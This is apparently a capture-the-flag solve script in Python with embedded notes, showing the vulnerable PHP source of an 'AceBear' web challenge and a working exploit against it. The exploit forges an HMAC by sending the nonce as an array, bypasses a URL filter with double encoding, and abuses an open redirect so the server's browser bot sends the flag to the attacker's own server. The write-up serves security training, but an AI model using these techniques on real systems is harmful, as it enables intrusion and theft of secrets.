import requests
import hmac
import hashlib

'''

    function filter($x){
        $x = (string)$x; 
        if(preg_match('/http|https|\@|\s|:|\/\//mi',$x)){
            return false;
        }
        return $x;
    }

    if(isset($_POST['messid'])){

	$messid = $_POST['messid'];
	validate_hash();
	$url="";
	if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local'){
		$url = 'http://'.$_POST['storagesv'].'/';
	} elseif ($_POST['storagesv']==="gimmeflag") {
		die('AceBear{******}');
	}

	$messid = filter($messid);

	if($messid){	
	  $url .= $messid;
          $out = shell_exec('/usr/bin/python '.$BROWSER_BOT.' '.escapeshellarg('http://route.local/?url='.urlencode($url)).' 2>&1');
        } else {
            die('Hey, are you a haxor?');
        }
    }
'''

'''
In server's robots.txt (messid: /robots.txt)

User-agent: *
Disallow: /index_09cd45eff1caa0e.txt

In the text file /index_09cd45eff1caa0e.txt:
<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">&lt;?php
        if(isset($_GET['url'])){
		        $url = (string)$_GET['url'];
			header('Location: '.$url.'?flag=***SECRET***:');

	}	
?&gt;
</pre></body></html>

I used ?url= one more time to pass the double url-encoded value to bypass the filter.
'''

my_server = your_server

r = requests.post('http://35.198.201.83/download.php', data={
	'nonce[]': '1',
	'storagesv': 'a',
	'hash': hmac.new('', 'a', hashlib.sha256).hexdigest(),
	'messid': '?url=%68%74%74%70%3a%2f/' + my_server
	})
print r.text


